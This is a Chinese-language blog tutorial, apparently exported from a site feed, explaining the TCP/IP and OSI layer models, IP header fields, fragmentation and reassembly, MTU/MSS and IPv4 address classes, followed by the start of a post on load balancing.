<h2 id="TCP-IP四层模型"><a href="#TCP-IP四层模型" class="headerlink" title="TCP/IP四层模型"></a>TCP/IP四层模型</h2></blockquote>
<p>在TCP/IP参考模型中，去掉了OSI参考模型中的会话层和表示层（这两层的功能被合并到应用层实现）。同时将OSI参考模型中的数据链路层和物理层合并为主机到网络层。下面，分别介绍各层的主要功能。
　　</p>
<blockquote>
<ul>
<li>链路层</li>
</ul>
</blockquote>
<p>实际上TCP/IP参考模型没有真正描述这一层的实现，只是要求能够提供给其上层-网络互连层一个访问接口，以便在其上传递IP分组。由于这一层次未被定义，所以其具体的实现方法将随着网络类型的不同而不同。　　</p>
<blockquote>
<ul>
<li>网络层　　</li>
</ul>
</blockquote>
<p>网络互连层是整个TCP/IP协议栈的核心。它的功能是把分组发往目标网络或主机。同时，为了尽快地发送分组，可能需要沿不同的路径同时进行分组传递。因此，分组到达的顺序和发送的顺序可能不同，这就需要上层必须对分组进行排序。　　<br>网络互连层定义了分组格式和协议，即IP协议（Internet Protocol）。　　<br>网络互连层除了需要完成路由的功能外，也可以完成将不同类型的网络（异构网）互连的任务。除此之外，网络互连层还需要完成拥塞控制的功能。　　</p>
<blockquote>
<ul>
<li>传输层　</li>
</ul>
</blockquote>
<p>在TCP/IP模型中，传输层的功能是使源端主机和目标端主机上的对等实体可以进行会话。在传输层定义了两种服务质量不同的协议。即：传输控制协议TCP（transmission control protocol）和用户数据报协议UDP（user datagram protocol）。　　<br>TCP协议是一个面向连接的、可靠的协议。它将一台主机发出的字节流无差错地发往互联网上的其他主机。在发送端，它负责把上层传送下来的字节流分成报文段并传递给下层。在接收端，它负责把收到的报文进行重组后递交给上层。TCP协议还要处理端到端的流量控制，以避免缓慢接收的接收方没有足够的缓冲区接收发送方发送的大量数据。　　<br>UDP协议是一个不可靠的、无连接协议，主要适用于不需要对报文进行排序和流量控制的场合。　　</p>
<blockquote>
<ul>
<li>应用层　　</li>
</ul>
</blockquote>
<p>TCP/IP模型将OSI参考模型中的会话层和表示层的功能合并到应用层实现。　　<br>应用层面向不同的网络应用引入了不同的应用层协议。其中，有基于TCP协议的，如文件传输协议（File Transfer Protocol，FTP）、虚拟终端协议（TELNET）、超文本链接协议（Hyper Text Transfer Protocol，HTTP），也有基于UDP协议的。</p>
<blockquote>
<h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2></blockquote>
<p>OSI（Open System Interconnection，开放系统互连）七层网络模型称为开放式系统互联参考模型 ，是一个逻辑上的定义，一个规范，它把网络从逻辑上分为了7层。每一层都有相关、相对应的物理设备，比如路由器，交换机。OSI 七层模型是一种框架性的设计方法 ，建立七层模型的主要目的是为解决异种网络互连时所遇到的兼容性问题，其最主要的功能使就是帮助不同类型的主机实现数据传输。它的最大优点是将服务、接口和协议这三个概念明确地区分开来，通过七个层次化的结构模型使不同的系统不同的网络之间实现可靠的通讯。</p>
<blockquote>
<h4 id="模型优点"><a href="#模型优点" class="headerlink" title="模型优点"></a>模型优点</h4></blockquote>
<p>建立七层模型的主要目的是为解决异种网络互连时所遇到的兼容性问题。它的最大优点是将服务、接口和协议这三个概念明确地区分开来：服务说明某一层为上一层提供一些什么功能，接口说明上一层如何使用下层的服务，而协议涉及如何实现本层的服务；这样各层之间具有很强的独立性，互连网络中各实体采用什么样的协议是没有限制的，只要向上提供相同的服务并且不改变相邻层的接口就可以了。网络七层的划分也是为了使网络的不同功能模块（不同层次）分担起不同的职责，从而带来如下好处： 　</p>
<blockquote>
<ul>
<li>减轻问题的复杂程度，一旦网络发生故障，可迅速定位故障所处层次，便于查找和纠错； 　</li>
<li>在各层分别定义标准接口，使具备相同对等层的不同网络设备能实现互操作，各层之间则相对独立，一种高层协议可放在多种低层协议上运行； </li>
<li>能有效刺激网络技术革新，因为每次更新都可以在小范围内进行，不需对整个网络动大手术； </li>
<li>便于研究和教学。</li>
</ul>
<h2 id="物理层（Physical-Layer）"><a href="#物理层（Physical-Layer）" class="headerlink" title="物理层（Physical Layer）"></a>物理层（Physical Layer）</h2></blockquote>
<p>O S I 模型的最低层或第一层，该层包括物理连网媒介，如电缆连线连接器。物理层的协议产生并检测电压以便发送和接收携带数据的信号。在你的桌面P C 上插入网络接口卡，你就建立了计算机连网的基础。换言之，你提供了一个物理层。尽管物理层不提供纠错服务，但它能够设定数据传输速率并监测数据出错率。网络物理问题，如电线断开，将影响物理层。 用户要传递信息就要利用一些物理媒体，如双绞线、同轴电缆等，但具体的物理媒体并不在OSI的7层之内，有人把物理媒体当做第0层，物理层的任务就是为它的上一层提供一个物理连接，以及它们的机械、电气、功能和过程特性。如规定使用电缆和接头的类型、传送信号的电压等。在这一层，数据还没有被组织，仅作为原始的位流或电气电压处理，单位是bit比特。</p>
<blockquote>
<h2 id="数据链路层（Datalink-Layer）"><a href="#数据链路层（Datalink-Layer）" class="headerlink" title="数据链路层（Datalink Layer）"></a>数据链路层（Datalink Layer）</h2></blockquote>
<p>OSI模型的第二层，它控制网络层与物理层之间的通信。它的主要功能是如何在不可靠的物理线路上进行数据的可靠传递。为了保证传输，从网络层接收到的数据被分割成特定的可被物理层传输的帧。帧是用来移动数据的结构包，它不仅包括原始数据，还包括发送方和接收方的物理地址以及检错和控制信息。其中的地址确定了帧将发送到何处，而纠错和控制信息则确保帧无差错到达。 如果在传送数据时，接收点检测到所传数据中有差错，就要通知发送方重发这一帧。 数据链路层的功能独立于网络和它的节点和所采用的物理层类型，它也不关心是否正在运行 Word、Excel 或使用Internet。有一些连接设备，如交换机，由于它们要对帧解码并使用帧信息将数据发送到正确的接收方，所以它们是工作在数据链路层的。 　　数据链路层（DataLinkLayer):在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路，通过差错控制提供数据帧（Frame）在信道上无差错的传输，并进行各电路上的动作系列。 　　数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。 　　数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。</p>
<blockquote>
<h2 id="网络层（Network-Layer）"><a href="#网络层（Network-Layer）" class="headerlink" title="网络层（Network Layer）"></a>网络层（Network Layer）</h2></blockquote>
<p>O S I 模型的第三层，其主要功能是将网络地址翻译成对应的物理地址，并决定如何将数据从发送方路由到接收方。 　　网络层通过综合考虑发送优先权、网络拥塞程度、服务质量以及可选路由的花费来决定从一个网络中节点A 到另一个网络中节点B 的最佳路径。由于网络层处理，并智能指导数据传送，路由器连接网络各段，所以路由器属于网络层。在网络中，“路由”是基于编址方案、使用模式以及可达性来指引数据的发送。 　　网络层负责在源机器和目标机器之间建立它们所使用的路由。这一层本身没有任何错误检测和修正机制，因此，网络层必须依赖于端端之间的由D L L提供的可靠传输服务。 　　网络层用于本地L A N网段之上的计算机系统建立通信，它之所以可以这样做，是因为它有自己的路由地址结构，这种结构与第二层机器地址是分开的、独立的。这种协议称为路由或可路由协议。路由协议包括Ip、Novell公司的IPX以及Appe Talk协议。 　<br>网络层是可选的，它只用于当两个计算机系统处于不同的由路由器分割开的网段这种情况，或者当通信应用要求某种网络层或传输层提供的服务、特性或者能力时。例如，当两台主机处于同一个LAN网段的直接相连这种情况，它们之间的通信只使用LAN的通信机制就可以了(即OSI 参考模型的一二层)。</p>
<blockquote>
<h2 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h2></blockquote>
<p>OSI模型中最重要的一层。传输协议同时进行流量控制或是基于接收方可接收数据的快慢程度规定适当的发送速率。除此之外，传输层按照网络能处理的最大尺寸将较长的数据包进行强制分割。例如，以太网无法接收大于1 5 0 0 字节的数据包。发送方节点的传输层将数据分割成较小的数据片，同时对每一数据片安排一序列号，以便数据到达接收方节点的传输层时，能以正确的顺序重组。该过程即被称为排序。 　　工作在传输层的一种服务是 TCP/IP协议套中的TCP(传输控制协议），另一项传输层服务是IPX/SPX 协议集的SPX（序列包交换）。</p>
<blockquote>
<h2 id="会话层（Session-Layer）"><a href="#会话层（Session-Layer）" class="headerlink" title="会话层（Session Layer）"></a>会话层（Session Layer）</h2></blockquote>
<p>负责在网络中的两节点之间建立、维持和终止通信。 会话层的功能包括：建立通信链接，保持会话过程通信链接的畅通，同步两个节点之间的对话，决定通信是否被中断以及通信中断时决定从何处重新发送。 　　你可能常常听到有人把会话层称作网络通信的“交通警察”。当通过拨号向你的 ISP （因特网服务提供商）请求连接到因特网时，ISP 服务器上的会话层向你与你的 PC 客户机上的会话层进行协商连接。若你的电话线偶然从墙上插孔脱落时，你终端机上的会话层将检测到连接中断并重新发起连接。会话层通过决定节点通信的优先级和通信时间的长短来设置通信期限.</p>
<blockquote>
<h2 id="表示层（Presentation-Layer）"><a href="#表示层（Presentation-Layer）" class="headerlink" title="表示层（Presentation Layer）"></a>表示层（Presentation Layer）</h2></blockquote>
<p>应用程序和网络之间的翻译官，在表示层，数据将按照网络能理解的方案进行格式化；这种格式化也因所使用网络的类型不同而不同。 　　表示层管理数据的解密与加密，如系统口令的处理。例如：在 Internet上查询你银行账户，使用的即是一种安全连接。你的账户数据在发送前被加密，在网络的另一端，表示层将对接收到的数据解密。除此之外，表示层协议还对图片和文件格式信息进行解码和编码。</p>
<blockquote>
<h2 id="应用层（Application-Layer）"><a href="#应用层（Application-Layer）" class="headerlink" title="应用层（Application Layer）"></a>应用层（Application Layer）</h2></blockquote>
<p>应用层也称为应用实体（AE），它由若干个特定应用服务元素（SASE）和一个或多个公用应用服务元素（CASE）组成。每个SASE提供特定的应用服务，例如文件运输访问和管理（FTAM）、电子文电处理（MHS）、虚拟终端协议（VAP）等。CASE提供一组公用的应用服务，例如联系控制服务元素（ACSE）、可靠运输服务元素（RTSE）和远程操作服务元素（ROSE）等。主要负责对软件提供接口以使程序能使用网络服务。术语“应用层”并不是指运行在网络上的某个特别应用程序 ，应用层提供的服务包括文件传输、文件管理以及电子邮件的信息处理。</p>
<blockquote>
<h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1></blockquote>
<p>IP是英文Internet Protocol的缩写，意思是“网络之间互连的协议”，也就是为计算机网络相互连接进行通信而设计的协议。在因特网中，它是能使连接到网上的所有计算机网络实现相互通信的一套规则，规定了计算机在因特网上进行通信时应当遵守的规则。任何厂家生产的计算机系统，只要遵守IP协议就可以与因特网互连互通。正是因为有了IP协议，因特网才得以迅速发展成为世界上最大的、开放的计算机通信网络。因此，IP协议也可以叫做“因特网协议”。</p>
<blockquote>
<h2 id="IP数据报"><a href="#IP数据报" class="headerlink" title="IP数据报"></a>IP数据报</h2></blockquote>
<p>TCP/IP协议定义了一个在因特网上传输的包，称为IP数据包，而IP数据报(IP Datagram)是个比较抽象的内容，是对数据包的结构进行分析。 由首部和数据两部分组成，其格式如图所示。首部的前一部分是固定长度，共20字节，是所有IP数据报必须具有的。在首部的固定部分的后面是一些可选字段，其长度是可变的。首部中的源地址和目的地址都是IP协议地址。</p>
<p><img src="https://i.imgur.com/hDjggCb.png" alt></p>
<blockquote>
<h3 id="固定部分"><a href="#固定部分" class="headerlink" title="固定部分"></a>固定部分</h3></blockquote>
<p>(1)版本 占4位,指IP协议的版本。通信双方使用的IP协议版本必须一致。目前广泛使用的IP协议版本号为4（即IPv4)。</p>
<p>(2)首部长度　占4位，可表示的最大十进制数值是15。请注意，这个字段所表示数的单位是32位字长（1个32位字长是4字节），因此，当IP的首部长度为1111时（即十进制的15），首部长度就达到60字节。当IP分组的首部长度不是4字节的整数倍时，必须利用最后的填充字段加以填充。因此数据部分永远在4字节的整数倍开始，这样在实现IP协议时较为方便。首部长度限制为60字节的缺点是有时可能不够用。但这样做是希望用户尽量减少开销。最常用的首部长度就是20字节（即首部长度为0101），这时不使用任何选项。</p>
<p>(3)区分服务　占8位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998年IETF把这个字段改名为区分服务DS(Differentiated Services)。只有在使用区分服务时，这个字段才起作用。<br>(4)总长度　总长度指首部和数据之和的长度，单位为字节。总长度字段为16位，因此数据报的最大长度为2^16-1=65535字节。<br>在IP层下面的每一种数据链路层都有自己的帧格式，其中包括帧格式中的数据字段的最大长度，这称为最大传送单元MTU(Maximum Transfer Unit)。当一个数据报封装成链路层的帧时，此数据报的总长度（即首部加上数据部分）一定不能超过下面的数据链路层的MTU值。<br>(5)标识(identification)　占16位。IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加1，并将此值赋给标识字段。但这个“标识”并不是序号，因为IP是无连接服务，数据报不存在按序接收的问题。当数据报由于长度超过网络的MTU而必须分片时，这个标识字段的值就被复制到所有的数据报的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。<br>(6)标志(flag)　占3位，但目前只有2位有意义。</p>
<blockquote>
<ul>
<li><p>标志字段中的最低位记为MF(MoreFragment)。MF=1即表示后面“还有分片”的数据报。MF=0表示这已是若干数据报片中的最后一个。</p>
</li>
<li><p>标志字段中间的一位记为DF(Don’t Fragment)，意思是“不能分片”。只有当DF=0时才允许分片。</p>
</li>
</ul>
</blockquote>
<p>(7)片偏移　占13位。片偏移指出：较长的分组在分片后，某片在原分组中的相对位置。也就是说，相对用户数据字段的起点，该片从何处开始。片偏移以8个字节为偏移单位。这就是说，除了最后一个分片，每个分片的长度一定是8字节（64位）的整数倍。<br>(8)生存时间　占8位，生存时间字段常用的的英文缩写是TTL(Time To Live)，表明是数据报在网络中的寿命。由发出数据报的源点设置这个字段。其目的是防止无法交付的数据报无限制地在因特网中兜圈子，因而白白消耗网络资源。最初的设计是以秒作为TTL的单位。每经过一个路由器时，就把TTL减去数据报在路由器消耗掉的一段时间。若数据报在路由器消耗的时间小于1秒，就把TTL值减1。当TTL值为0时，就丢弃这个数据报。后来把TTL字段的功能改为“跳数限制”（但名称不变）。路由器在转发数据报之前就把TTL值减1.若TTL值减少到零，就丢弃这个数据报，不再转发。因此，现在TTL的单位不再是秒，而是跳数。TTL的意义是指明数据报在网络中至多可经过多少个路由器。显然，数据报在网络上经过的路由器的最大数值是255.若把TTL的初始值设为1，就表示这个数据报只能在本局域网中传送。</p>
<p>TTL的作用是限制IP数据包在计算机网络中的存在的时间。TTL的最大值是255，TTL的一个推荐值是64。<br>虽然TTL从字面上翻译，是可以存活的时间，但实际上TTL是IP数据包在计算机网络中可以转发的最大跳数。TTL字段由IP数据包的发送者设置，在IP数据包从源到目的的整个转发路径上，每经过一个路由器，路由器都会修改这个TTL字段值，具体的做法是把该TTL的值减1，然后再将IP包转发出去。如果在IP包到达目的IP之前，TTL减少为0，路由器将会丢弃收到的TTL=0的IP包并向IP包的发送者发送 ICMP time exceeded消息。<br>TTL的主要作用是避免IP包在网络中的无限循环和收发，节省了网络资源，并能使IP包的发送者能收到告警消息。<br>TTL 是由发送主机设置的，以防止数据包不断在IP互联网络上永不终止地循环。转发IP数据包时，要求路由器至少将 TTL 减小 1。<br>生存时间，就是一条域名解析记录在DNS服务器中的存留时间。当各地的DNS服务器接受到解析请求时，就会向域名指定的NS服务器(权威域名服务器）发出解析请求从而获得解析记录；在获得这个记录之后，记录会在DNS服务器(各地的缓存服务器，也叫递归域名服务器）中保存一段时间，这段时间内如果再接到这个域名的解析请求，DNS服务器将不再向NS服务器发出请求，而是直接返回刚才获得的记录；而这个记录在DNS服务器上保留的时间，就是TTL值。</p>
<p>(9)协议　占8位，协议字段指出此数据报携带的数据是使用何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个处理过程。<br>(10)首部检验和　占16位。这个字段只检验数据报的首部，但不包括数据部分。这是因为数据报每经过一个路由器，路由器都要重新计算一下首部检验和（一些字段，如生存时间、标志、片偏移等都可能发生变化）。不检验数据部分可减少计算的工作量。<br>(11)源地址　占32位。<br>(12)目的地址　占32位。</p>
<blockquote>
<h3 id="可变部分"><a href="#可变部分" class="headerlink" title="可变部分"></a>可变部分</h3></blockquote>
<p>IP首部的可变部分就是一个可选字段。选项字段用来支持排错、测量以及安全等措施，内容很丰富。此字段的长度可变，从1个字节到40个字节不等，取决于所选择的项目。某些选项项目只需要1个字节，它只包括1个字节的选项代码。但还有些选项需要多个字节，这些选项一个个拼接起来，中间不需要有分隔符，最后用全0的填充字段补齐成为4字节的整数倍。<br>增加首部的可变部分是为了增加IP数据报的功能，但这同时也使得IP数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。实际上这些选项很少被使用。新的IP版本IPv6就将IP数据报的首部长度做成固定的。<br>目前，这些任选项定义如下：<br>（1）安全和处理限制（用于军事领域）<br>（2）记录路径（让每个路由器都记下它的IP地址）<br>（3）时间戳（Time Stamp）（让每个路由器都记下IP数据报经过每一个路由器的IP地址和当地时间）<br>（4）宽松的源站路由（Loose Source Route）（为数据报指定一系列必须经过的IP地址）<br>（5）严格的源站路由（Strict Source Route） （与宽松的源站路由类似，但是要求只能经过指定的这些地址，不能经过其他的地址)<br>  这些选项很少被使用，并非所有主机和路由器都支持这些选项。</p>
<blockquote>
<h1 id="IP分组和重组"><a href="#IP分组和重组" class="headerlink" title="IP分组和重组"></a>IP分组和重组</h1><h3 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h3><h4 id="IP分片的原理"><a href="#IP分片的原理" class="headerlink" title="IP分片的原理"></a>IP分片的原理</h4></blockquote>
<p>分片和重新组装的过程对传输层是透明的，其原因是当IP数据报进行分片之后，只有当它到达下一站时，才可进行重新组装，且它是由目的端的IP层来完成的。分片之后的数据报根据需要也可以再次进行分片。<br>IP分片和完整IP报文差不多拥有相同的IP头，ID域对于每个分片都是一致的，这样才能在重新组装的时候识别出来自同一个IP报文的分片。在IP头里面，16位识别号唯一记录了一个IP包的ID（ipid），具有同一个ID的IP分片将会重新组装；而13位片偏移则记录了某IP片相对整个包的位置；而这两个表中间的3位标志则标志着该分片后面是否还有新的分片。这三个域就组成了IP分片的所有信息， 接受方就可以利用这些信息对IP数据进行重新组织。</p>
<blockquote>
<ul>
<li>1、标志字段的作用</li>
</ul>
</blockquote>
<p>标志字段在分片数据报中起了很大作用，在数据报分片时把它的值复制到每片中。标志字段的其中一个比特称作“不分片”位，用其中一个比特来表示“更多的片”。除了最后一片外，其他每个组成数据报的片都要把该比特置1。片偏移字段指的是该片偏移原始数据报开始处的位置。另外，当数据报被分片后，每个片的总长度值要改为该片的长度值。如果将标志字段的”不分片”比特置1，则IP将不对数据报进行分片。相反把数据报丢弃并发送一个I C M P差错报文并通知源主机废弃的原因。如果不是特殊需要，则不应该置1；最右比特置1表示该报文不是最后一个IP分片。<br>    故意发送部分IP分片而不是全部，则会导致目标主机总是等待分片消耗并占用系统资源。某些分片风暴攻击就是这种原理。<br>    这里以以太网为例，由于以太网传输电气方面的限制，每个以太网帧都有最小的大小64bytes最大不能超过1518bytes， 抛去以太网帧的帧头(DMAC目的MAC地址48bit=6Bytes+SMAC源MAC地址48bit=6Bytes+Type域2bytes)14Bytes和帧尾CRC校验部分4Bytes，那么剩下承载上层协议的地方也就是Data域最大就只能有1500Bytes，这就是前面所说的MTU的值。这个也是网络层协议非常关心的地方，因为网络层的IP协议会根据这个值来决定是否把上层传达下来的数据进行分片。就好比一个盒子没法装下一大块面包，我们需要把面包切成片，装在多个盒子里面一样的道理。</p>
<blockquote>
<ul>
<li>2、MTU原理</li>
</ul>
</blockquote>
<p>当两台远程PC互联的时候，它们的数据需要穿过很多的路由器和各种各样的网络媒介才能到达对端，网络中不同媒介的MTU各不相同，就好比一长段的水管，由不同粗细的水管组成(MTU不同 )通过这段水管最大水量就要由中间最细的水管决定。</p>
<p> 对于网络层的上层协议而言(这里以TCP/IP协议族为例)它们对水管粗细不在意它们认为这个是网络层的事情。网络层IP协议会检查每个从上层协议下来的数据包的大小，并根据本机MTU的大小决定是否作“分片”处理。分片最大的坏处就是降低了传输性能，本来一次可以搞定的事情，分成多次搞定，所以在网络层更高一层(就是传输层)的实现中往往会对此加以注意!有些高层因为某些原因就会要求我这个面包不能切片，我要完整地面包，所以会在IP数据包包头里面加上一个标签:DF(Donot Fragment)。这样当这个IP数据包在一大段网络(水管里面)传输的时候，如果遇到MTU小于IP数据包的情况，转发设备就会根据要求丢弃这个数据包。然后返回一个错误信息给发送者。这样往往会造成某些通讯上的问题，不过幸运的是大部分网络链路MTU都是1500或者大于1500。</p>
<p>对于UDP协议而言，这个协议本身是无连接的协议，对数据包的到达顺序以及是否正确到达不甚关心，所以一般UDP应用对分片没有特殊要求。<br>　　<br>对于TCP协议而言就不一样了，这个协议是面向连接的协议，对于TCP协议而言它非常在意数据包的到达顺序以及是否传输中有错误发生。所以有些TCP应用对分片有要求—-不能分片(DF)。</p>
<blockquote>
<ul>
<li>3、MSS的原理</li>
</ul>
</blockquote>
<p>MSS就是TCP数据包每次能够传输的最大数据分段。为了达到最佳的传输效能TCP协议在建立连接的时候通常要协商双方的MSS值，这个值TCP协议在实现的时候往往用MTU值代替(需要减去IP数据包包头的大小20Bytes和TCP数据段的包头20Bytes)所以往往MSS为1460。通讯双方会根据双方提供的MSS值得最小值确定为这次连接的最大MSS值。<br>    当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部，并在选择路由时与其他分组独立。这样，当数据报的这些片到达目的端时有可能会失序，但是在IP首部中有足够的信息让接收端能正确组装这些数据报片。<br>    尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报。因为IP层本身没有超时重传的机制——由更高层来负责超时和重传（T C P有超时和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自T C P报文段的某一片丢失后，T C P在超时后会重发整个T C P报文段，该报文段对应于一份IP数据报。没有办法只重传数据报中的一个数据报片。</p>
<blockquote>
<h3 id="IP分片的步骤"><a href="#IP分片的步骤" class="headerlink" title="IP分片的步骤"></a>IP分片的步骤</h3></blockquote>
<p> 一个未分片的数据报的分片信息字段全为0，即多个分片标志位为0，并且片偏移量为0。分片一个数据报，需执行以下几个步骤：</p>
<blockquote>
<ul>
<li>检查DF标志位，查明是否允许分片。如果设置了该位，则数据报将被丢弃，并将一个ICMP错误返回给源端.</li>
<li>基于MTU值，把数据字段分成两个部分或者多个部分。除了最后的数据部分外，所有新建数据选项的长度必须为8个字节的倍数。</li>
<li>每个数据部分被放入一个IP数据报。这些数据报的报文头略微修改了原来的报文头。</li>
<li>除了最后的数据报分片外，所有分片都设置了多个分片标志位。</li>
<li>每个分片中的片偏移量字段设为这个数据部分在原来数据报中所占的位置，这个位置相对于原来未分片数据报中的开头处。</li>
<li>如果在原来的数据报中包括了选项，则选项类型字节的高位字节决定了这个信息是被复制到所有分片数据报，还是只复制到第一个数据报。</li>
<li>设置新数据报的报文头字段及总长度字段。</li>
<li>重新计算报文头部校验和字段。</li>
</ul>
</blockquote>
<p>此时，这些分片数据报中的每个数据报如一个完整IP数据报一样被转发。IP独立地处理每个数据报分片。数据报分片能够通过不同的路由器到达目的。如果它们通过那些规定了更小的MTU网络，则还能够进一步对它们进行分片。<br>在目的主机上，数据被重新组合成原来的数据报。发送主机设置的标识符字段与数据报中的源IP地址和目的IP地址一起使用。分片过程不改变这个字段。</p>
<blockquote>
<h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4></blockquote>
<p>为了重新组合这些数据报分片，接收主机在第一个分片到达时分配一个存储缓冲区。这个主机还将启动一个计时器。当数据报的后续分片到达时，数据被复制到缓冲区存储器中片偏移量字段指出的位置。当所有分片都到达时，完整的未分片的原始数据包就被恢复了。处理如同未分片数据报一样继续进行。<br>如果计时器超时并且分片保持尚未认可状态，则数据报被丢弃。这个计时器的初始值称为IP数据报的生存期值。它是依赖于实现的。一些实现允许对它进行配置。在某些IP主机上可以使用netstat命令列出分片的细节。如TCP/IP for OS/2中的netstat-i命令。<br>重组的步骤：<br>在接收方，一个由发送方发出的原始IP数据报，其所有分片将被重新组合，然后才能提交到上层协议。每一个将被重组的IP数据报都用一个ipq结构实例来表示，因此先来看看ipq这个非常重要的结构。<br>为了能高效地组装分片，用于保存分片的数据结构必须能做到以下几点：<br>1、快速定位属于某一个数据报的一组分组<br>2、在属于某一个数据报的一组分片中快速插入新的分片<br>3、有效地判断一个数据报的所有分片是否已经全部接收<br>4、具有组装超时机制，如果在重组完成之前定时器溢出，则删除该数据报的所有内容</p>
<blockquote>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2></blockquote>
<p> 现在的IP网络使用32位地址，以点分十进制表示，如172.16.0.0。地址格式为：IP地址=网络地址＋主机地址 或 IP地址=主机地址＋子网地址＋主机地址。 </p>
<blockquote>
<h3 id="IP地址类型"><a href="#IP地址类型" class="headerlink" title="IP地址类型"></a>IP地址类型</h3></blockquote>
<p>最初设计互联网络时，为了便于寻址以及层次化构造网络，每个IP地址包括两个标识码（ID），即网络ID和主机ID。同一个物理网络上的所有主机都使用同一个网络ID，网络上的一个主机（包括网络上工作站，服务器和路由器等）有一个主机ID与其对应。IP地址根据网络ID的不同分为5种类型，A类地址、B类地址、C类地址、D类地址和E类地址。</p>
<blockquote>
<ul>
<li><p>A类IP地址 一个A类IP地址由1字节的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”， 地址范围从1.0.0.0 到126.0.0.0。可用的A类网络有126个，每个网络能容纳1亿多个主机。  </p>
</li>
<li><p>B类IP地址 一个B类IP地址由2个字节的网络地址和2个字节的主机地址组成，网络地址的最高位必须是“10”，地址范围从128.0.0.0到191.255.255.255。可用的B类网络有16382个，每个网络能容纳6万多个主机 。 </p>
</li>
<li><p>C类IP地址 一个C类IP地址由3字节的网络地址和1字节的主机地址组成，网络地址的最高位必须是“110”。范围从192.0.0.0到223.255.255.255。C类网络可达209万余个，每个网络能容纳254个主机。 </p>
</li>
<li><p>D类地址用于多点广播（Multicast）。 D类IP地址第一个字节以“lll0”开始，它是一个专门保留的地址。它并不指向特定的网络，目前这一类地址被用在多点广播（Multicast）中。多点广播地址用来一次寻址一组计算机，它标识共享同一协议的一组计算机。224.0.0.0到239.255.255.255用于多点广播 。</p>
</li>
<li><p>E类IP地址 以“llll0”开始，为将来使用保留。240.0.0.0到255.255.255.254,255.255.255.255用于广播地  址。</p>
</li>
</ul>
</blockquote>
<p> 全零（“0．0．0．0”）地址对应于当前主机。全“1”的IP地址（“255．255．255．255”）是当前子网的广播地址。</p>
<p>在IP地址3种主要类型里，各保留了3个区域作为私有地址，其地址范围如下：</p>
<p>A类地址：10.0.0.0～10.255.255.255<br>B类地址：172.16.0.0～172.31.255.255<br>C类地址：192.168.0.0～192.168.255.255</p>
<p>A类地址的第一组数字为1～126。其中0代表任何地址，127为回环测试地址，注意，数字0和 127不作为A类地址，数字127保留给内部回送函数，而数字0则表示该地址是本地宿主机，不能传送。B类地址的第一组数字为128～191。C类地址的第一组数字为192～223。</p>
<ol>
<li><p>A类地址  A类地址的表示范围为：0.0.0.0~126.255.255.255，默认网络掩码为：255.0.0.0；A类地址分配给规模特别大的网络使用。A类网络用第一组数字表示网络本身的地址，后面三组数字作为连接于网络上的主机的地址。分配给具有大量主机（直接个人用户）而局域网络个数较少的大型网络。例如IBM公司的网络。</p>
</li>
<li><p>B类地址B类地址的表示范围为：128.0.0.0~191.255.255.255，默认网络掩码为：255.255.0.0；B类地址分配给一般的中型网络。B类网络用第一、二组数字表示网络的地址，后面两组数字代表网络上的主机地址。 </p>
</li>
<li><p>C类地址  C类地址的表示范围为：192.0.0.0~223.255.255.255，默认网络掩码为：255.255.255.0；C类地址分配给小型网络，如一般的局域网和校园网，它可连接的主机数量是最少的，采用把所属的用户分为若干的网段进行管理。C类网络用前三组数字表示网络的地址，最后一组数字作为网络上的主机地址。</p>
</li>
<li><p>实际上，还存在着D类地址和E类地址。但这两类地址用途比较特殊，在这里只是简单介绍一下：D类地址称为广播地址，供特殊协议向选定的节点发送信息时用。E类地址保留给将来使用。</p>
</li>
</ol>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol" target="_blank" rel="noopener">TCP</a></li>
<li><a href="http://linux.vbird.org/linux_server/0110network_basic.php" target="_blank" rel="noopener">基礎網路概念</a></li>
<li><a href="https://searchnetworking.techtarget.com.cn/12-15509/" target="_blank" rel="noopener">IP子网划分的基本概念</a></li>
<li>《TCP/IP详解卷1：协议》</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>tcp/ip</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>负载均衡详解</title>
    <url>/2018/04/12/distributed/loadbalance/</url>
    <content><![CDATA[<p>用户对维基媒体Elasticsearch服务器集群的请求通过负载均衡进行路由<br>在计算中，负载平衡可以改善跨多个计算资源（如计算机，计算机集群，网络链接，中央处理单元或磁盘驱动器）的工作负载分布。负载平衡旨在优化资源使用，最大化吞吐量，最小化响应时间并避免任何单一资源的过载。使用多个组件进行负载平衡而不是单个组件可能会通过冗余来提高可靠性和可用性。负载平衡通常涉及专用软件或硬件，例如多层交换机或域名系统服务器进程。<br><img src="/2018/04/12/distributed/loadbalance/lb_1.png" alt></p>
<p>负载平衡与通道绑定的不同之处在于负载平衡在网络套接字（OSI模型第4层）基础上划分网络接口之间的通信量，而通道绑定意味着在较低级别的物理接口之间进行流量划分，每个数据包（OSI模型层3）或基于最短路径桥接等协议的数据链路（OSI模型第2层）。<br>(以上来自wiki)                                  </p>
<p>负载均衡主要是多台服务器共同分担计算任务,把网络请求和计算分配到可用集群服务器上去.画个简单的图：</p>
<p><img src="/2018/04/12/distributed/loadbalance/lb_4.png" alt></p>
<blockquote>
